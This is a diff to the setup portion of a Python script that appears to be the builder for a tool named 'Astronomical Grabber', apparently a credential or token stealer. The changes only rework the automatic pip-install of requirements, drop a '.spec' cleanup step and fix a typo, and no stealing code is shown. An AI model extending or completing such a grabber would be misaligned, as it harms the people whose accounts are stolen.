@@ -1,14 +1,19 @@
 from os import system
+import sys
 import time
-install=input("Install Reqirements (has to be done only once)? y/n: ")
-if install=="y":
+try:
+  import os
+  import time
+  import requests
+  import base64
+  import shutil
+  from colorama import Fore, Style
+except:
   system("pip install -r requierments.txt")
   system("cls")
-  print("\n\nYou most likely need to open the programm again to reload the Modules!")
-  time.sleep(5)
-else:
-  print("\nIf you havent installed the Requirements the Programm wont work!")
-  time.sleep(2)
+  print("You need to restart the programm to reload the modlues.")
+  time.sleep(10)
+  sys.exit(0)
 import os
 import time
 import requests
@@ -18,10 +23,6 @@ from colorama import Fore, Style
 
 #Trying to delete old files if existing
 try:
-  system("del *.spec")
-except:
-  pass
-try:
   shutil.rmtree('grabber')
 except:
   pass
@@ -30,7 +31,7 @@ try:
 except:
   pass
 
-#Stting up Variables
+#Setting up Variables
 settings=" "
 
 #Update Maker (Updates Astronomical Grabber if there is an update) not quite sure if it works so better check out our Github!
